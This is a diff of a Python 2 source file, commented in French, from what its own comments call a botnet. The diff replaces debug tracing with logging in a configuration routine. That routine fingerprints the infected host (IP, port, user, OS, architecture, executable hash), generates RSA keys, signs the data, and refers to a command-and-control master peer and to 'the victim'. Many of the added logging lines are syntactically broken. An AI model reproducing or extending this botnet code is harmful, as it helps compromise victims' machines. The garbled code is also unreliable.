@@ -2,6 +2,8 @@
 # -*- coding: utf-8 -*-
 
 import os, sys, platform, shutil
+import logging
+import logging.handlers
 import time.time
 import random.randint
 import sqlite3
@@ -14,10 +16,6 @@ from Crypto.PublicKey.RSA import generate, importKey
 try : import _winreg, win32com.client
 except ImportError : pass
 from objet import *
-
-# Debogue
-sys.path.append("../Debogue")
-from debogue import *
 
 main = sys.modules['__main__']
 
@@ -293,7 +291,7 @@ def configuration() :
 			main.maconf.moi.id = random.randint(1, 2**63)
 			c.execute("INSERT INTO parametre(cle, valeur) VALUES('mon_id', '{0}')".format(main.maconf.moi.id))
 			changement = True
-			DEBOGUE().trace("moi.id", main.maconf.moi.id)
+			log.debug("moi.id {} = {}".format(type(main.maconf.moi.id)
 	
 	# Le moi.ip : notre IP tout simplement
 	while not main.maconf.moi.ip :
@@ -314,55 +312,55 @@ def configuration() :
 		main.maconf.moi.ip = s.getsockname()[0]
 		s.close()
 		changement = True
-		DEBOGUE().trace("moi.ip", main.maconf.moi.ip)
+		log.debug("moi.ip {} = {}".format(type(main.maconf.moi.ip), main.maconf.moi.ip))
 	
 	# Le moi.port : le port d'écoute du [composant] seveur
 	if not main.maconf.moi.port :
 		main.maconf.moi.port = 1212
 		changement = True
-		DEBOGUE().trace("moi.port", main.maconf.moi.port)
+		log.debug("moi.port {} = {}".format(type(main.maconf.moi.port)
 	
 	# Le moi.
-	espace = 100
+	espace = 100  # ici on remonte la taille du disque
 	if main.maconf.moi.espace != espace :
 		main.maconf.moi.espace = espace
 		changement = True
-		DEBOGUE().trace("moi.espace", main.maconf.moi.espace)
+		log.debug("moi.espace {} = {}".format(type(main.maconf.moi.espace)
 	
 	# Le moi.
-	espace_consome = 33
+	espace_consome = 33  # ici on remonte l'espace disque utilisé (par la victime aussi)
 	if main.maconf.moi.espace_consome != espace_consome :
 		main.maconf.moi.espace_consome = espace_consome
 		changement = True
-		DEBOGUE().trace("moi.espace_consome", main.maconf.moi.espace_consome)
+		log.debug("moi.espace_consome {} = {}".format(type(main.maconf.moi.espace_consome)
 	
 	# Le moi.
 	privilege = os.environ["USER"]  # ou LOGNAME
 	if main.maconf.moi.privilege != privilege :
 		main.maconf.moi.privilege = privilege
 		changement = True
-		DEBOGUE().trace("moi.privilege", main.maconf.moi.privilege)
+		log.debug("moi.privilege {} = {}".format(type(main.maconf.moi.privilege)
 	
 	# Le moi.
 	systeme = platform.system()
 	if main.maconf.moi.systeme != systeme :
 		main.maconf.moi.systeme = systeme
 		changement = True
-		DEBOGUE().trace("moi.systeme", main.maconf.moi.systeme)
+		log.debug("moi.systeme {} = {}".format(type(main.maconf.moi.systeme)
 	
 	# Le moi.
 	arch = platform.machine()
 	if main.maconf.moi.arch != arch :
 		main.maconf.moi.arch = arch
 		changement = True
-		DEBOGUE().trace("moi.arch", main.maconf.moi.arch)
+		log.debug("moi.arch {} = {}".format(type(main.maconf.moi.arch)
 	
 	# Le moi.
 	sha256 = hashlib.sha256(open(main.maconf.executable).read()).hexdigest()
 	if main.maconf.moi.sha256 != sha256 :
 		main.maconf.moi.sha256 = sha256
 		changement = True
-		DEBOGUE().trace("moi.sha256", main.maconf.moi.sha256)
+		log.debug("moi.sha256 {} = {}".format(type(main.maconf.moi.sha256)
 	
 	# Ma cle privée pour authentifier nos paramettre et leur mise à jour
 	with sqlite3.connect(main.maconf.mabdd) as cnx :
@@ -377,26 +375,26 @@ def configuration() :
 			main.maconf.moi.cle_privee = generate(4096, RandomPool().get_bytes)
 			c.execute("INSERT INTO parametre(cle, valeur) VALUES('ma_cle_privee', '{0}')".format(main.maconf.moi.cle_privee.exportKey()))
 			changement = True
-			DEBOGUE().trace("moi.cle_privee", main.maconf.moi.cle_privee)
+			log.debug("moi.cle_privee {} = {}".format(type(main.maconf.moi.cle_privee)
 	
 	# Le moi.cle : notre clé publique
 	cle = main.maconf.moi.cle_privee.publickey()
 	if not main.maconf.moi.cle or main.maconf.moi.cle != cle :
 		main.maconf.moi.cle = cle
 		changement = True
-		DEBOGUE().trace("moi.cle", main.maconf.moi.cle)
+		log.debug("moi.cle {} = {}".format(type(main.maconf.moi.cle)
 	
 	# On sauvegarde nos paramêtres
 	if changement :
 		main.maconf.moi.date = time.time()
-		DEBOGUE().trace("moi.date", main.maconf.moi.date)
+		log.debug("moi.date {} = {}".format(type(main.maconf.moi.date)
 		message = "{0.id}\n{0.ip}\n{0.port}\n{0.espace}\n\
 			{0.espace_consome}\n{0.privilege}\n{0.systeme}\n\
 			{0.arch}\n{0.sha256}\n{0.date}".format(main.maconf.moi)
 		main.maconf.moi.signature = main.maconf.moi.cle_privee.sign(message, None)[0]
-		DEBOGUE().trace("moi.signature", main.maconf.moi.signature)
+		log.debug("moi.signature {} = {}".format(type(main.maconf.moi.signature)
 		main.maconf.moi.save()
-		DEBOGUE().trace("ICI", "moi.save()")
+		log.debug("ICI", "moi.save()")
 	
 	# Le master.id : l'ID de la paire jouant le rôle de Master, la paire de contrôle et commande du botnet
 	with sqlite3.connect(main.maconf.mabdd) as cnx :
@@ -453,14 +451,14 @@ def configuration() :
 	## Notre empleinte logicielle
 	#sha256 = hashlib.sha256(open(main.maconf.executable).read()).hexdigest()
 	#if main.maconf.digest.sha256 != sha256 :
-		#DEBOGUE().trace("ICI", "Le hach a changé")
+		#log.debug("ICI", "Le hach a changé")
 		#main.maconf.digest.sha256 = sha256
 		#main.maconf.digest.date = 1.0
 		#main.maconf.digest.signature = long(1)
 		#main.maconf.digest.save()
 	
 	#if main.maconf.digest.signature <= 1 and main.maconf.moi.id == main.maconf.master.id :
-		#DEBOGUE().trace("ICI", "Pas de signature alors qu'on est master")
+		#log.debug("ICI", "Pas de signature alors qu'on est master")
 		#main.maconf.digest.date = time.time()
 		#message = "{0.sha256}\n{0.date}".format(main.maconf.digest)
 		#main.maconf.digest.signature = main.maconf.master.cle_privee.sign(str(message), None)[0]
